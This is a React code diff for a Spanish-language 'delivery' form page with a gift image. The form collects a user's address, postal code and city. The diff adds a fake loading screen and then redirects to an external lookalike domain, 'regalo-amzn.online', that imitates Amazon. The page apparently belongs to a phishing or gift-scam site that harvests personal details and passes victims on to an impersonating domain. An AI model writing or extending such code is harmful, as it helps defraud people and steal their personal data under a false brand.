@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import Header from '../../componentes/header/Header';
 import './style.css';
 import presentes from '../../assets/presentes.jpeg';
@@ -7,12 +7,13 @@ import { useNavigate } from 'react-router-dom';
 export default function Entrega() {
   const navigate = useNavigate();
   const [error, setError] = useState(''); // Estado para armazenar a mensagem de erro
-
+  const [isLoading, setIsLoading] = useState(false);
   // Estados para armazenar os valores dos campos
   const [direccion, setDireccion] = useState('');
   const [apto, setApto] = useState('');
   const [codigoPostal, setCodigoPostal] = useState('');
   const [ciudad, setCiudad] = useState('');
+  const [height, setHeight] = useState(window.innerHeight);
 
   const handleClick = () => {
     // Verifica se os campos obrigatórios estão preenchidos
@@ -20,10 +21,31 @@ export default function Entrega() {
       setError('Por favor, completa todos los campos obligatorios.'); // Mensagem de erro em espanhol
       return; // Impede o redirecionamento
     }
-
-    // Se todos os campos obrigatórios estiverem preenchidos, redireciona
-    navigate('/outra-pagina');
+  
+    // Inicia o loading
+    setIsLoading(true);
+  
+    // Simula um tempo de carregamento antes de redirecionar
+    setTimeout(() => {
+      window.location.href = 'https://regalo-amzn.online/pg3/'; // Redireciona para o link externo
+    }, 3000); // 3 segundos de simulação de carregamento
   };
+
+  const startLoading = (callback) => {
+    setIsLoading(true); // Ativa o loading
+    setTimeout(() => {
+      setIsLoading(false); // Desativa o loading após 2 segundos
+      if (callback) callback(); // Executa o callback (navegação)
+    }, 2000);
+  };
+
+  useEffect(() => {
+    const updateHeight = () => {
+      setHeight(window.innerHeight);
+    };
+    window.addEventListener('resize', updateHeight);
+    return () => window.removeEventListener('resize', updateHeight);
+  }, []);
 
   return (
     <>
@@ -124,6 +146,11 @@ export default function Entrega() {
           Enviar
         </button>
       </form>
+
+      {/* Tela de carregamento */}
+      <div className='telaCarregamentoContainer' style={{ display: isLoading ? 'flex' : 'none', height: height }}>
+        <div className="loader"></div>
+      </div>
     </>
   );
 }
